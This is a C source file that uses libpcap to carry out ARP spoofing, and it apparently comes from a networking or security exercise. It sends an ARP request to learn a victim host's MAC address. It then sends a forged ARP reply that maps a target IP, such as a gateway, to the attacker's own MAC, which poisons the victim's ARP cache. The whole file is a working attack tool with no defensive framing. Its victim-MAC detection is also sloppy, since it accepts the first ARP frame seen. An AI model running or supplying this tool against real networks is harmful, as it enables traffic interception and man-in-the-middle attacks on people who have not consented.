#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <linux/if.h>
#include <uchar.h>


uint8_t my_ip[4];
uint8_t my_mac[6];
uint8_t sender_ip[4];
uint8_t target_ip[4];
uint8_t sender_mac[6];

typedef struct eth_header {
   uint8_t dst_mac[6];   //arp_req:FF~, arp_rep:mac
   uint8_t src_mac[6];
   uint16_t ethet_type;   //arp:0x0806
   unsigned char arp_data[28];
   uint8_t dm[18];
}ETH;

typedef struct arp_header {
   uint16_t hw_type;
   uint16_t prot_type;    //IP4 0x0800
   uint8_t Hlen;          //이더넷 6
   uint8_t Plen;         //IP4 4
   uint16_t op_code;      //arp_req:1, rep:2
   uint8_t sender_mac[6];
   uint8_t sender_ip[4];
   uint8_t target_mac[6];
   uint8_t target_ip[4];
}ARP;

void find_mymac(char *dev_name)
{
   struct ifreq s;
   int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
   strcpy(s.ifr_name, dev_name);
   ioctl(fd, SIOCGIFHWADDR, &s);
   memcpy(my_mac, s.ifr_hwaddr.sa_data, 6);
}


void find_myip()
{
   struct ifaddrs *ifap, *ifa;
   struct sockaddr_in *sa;
   char *addr;
   int tmp = 0;
   getifaddrs(&ifap);
   for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
      if (ifa->ifa_addr->sa_family == AF_INET) {
         sa = (struct sockaddr_in *) ifa->ifa_addr;
      }
   }
   memcpy(my_ip, &(sa->sin_addr.s_addr), 4);
   freeifaddrs(ifap);
}

void get_sender_mac(pcap_t *handle)
{
   struct pcap_pkthdr *header;
   const uint8_t *data;
   while(1) {
      pcap_next_ex(handle, &header, &data);
      if(!memcmp(data+12, "\x08\x06", 2)) {
         printf("Length : %d\n", header->caplen);
         memcpy(sender_mac, data +6, 6);
         break;
      }
   }
}

void arp_sending(pcap_t *handle,int opcode, uint8_t *sender_mac, uint8_t *sender_ip, uint8_t *target_mac, uint8_t *target_ip){
   ETH eth;
   ARP arp;
   if(opcode == 1){
      memcpy(eth.dst_mac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
      memcpy(arp.target_mac, "\x00\x00\x00\x00\x00\x00", 6);
   }
      
   else{
      memcpy(eth.dst_mac, target_mac, 6);
      memcpy(arp.target_mac, target_mac, 6);
   }
      
   memcpy(eth.src_mac, sender_mac, 6);
   eth.ethet_type = ntohs(0x0806);
   arp.hw_type = ntohs(0x0001);
   arp.prot_type = ntohs(0x0800);
   arp.Hlen = 0x06;
   arp.Plen = 0x04;
   arp.op_code = ntohs(opcode);
   memcpy(arp.sender_mac, sender_mac, 6);
   memcpy(arp.sender_ip, sender_ip, 4);
   memcpy(arp.target_ip, target_ip, 4);
   memcpy(eth.arp_data, &arp, sizeof(arp));
   pcap_sendpacket(handle, (const unsigned char*)&eth, sizeof(eth));
}



int main(int argc, char* argv[])
{
   char * dev, errbuf[PCAP_ERRBUF_SIZE];
   dev = pcap_lookupdev(errbuf);
   if (dev == NULL)
   {
      fprintf(stderr, "Cannot Open Device : %s\n", errbuf);
      return 0;
   }
   pcap_t * handle;
   handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   if (handle == NULL)
   {
      fprintf(stderr, "Cannot Open Device %s\n %s\n", dev, errbuf);
      return 0;
   }
   inet_pton(AF_INET, argv[2], sender_ip);
   inet_pton(AF_INET, argv[3], target_ip);
   find_myip();
   find_mymac(argv[1]);
   arp_sending(handle, 1, my_mac, my_ip, NULL, sender_ip);
   get_sender_mac(handle);
   arp_sending(handle, 2, my_mac, target_ip, sender_mac, sender_ip);
   return 0;
}
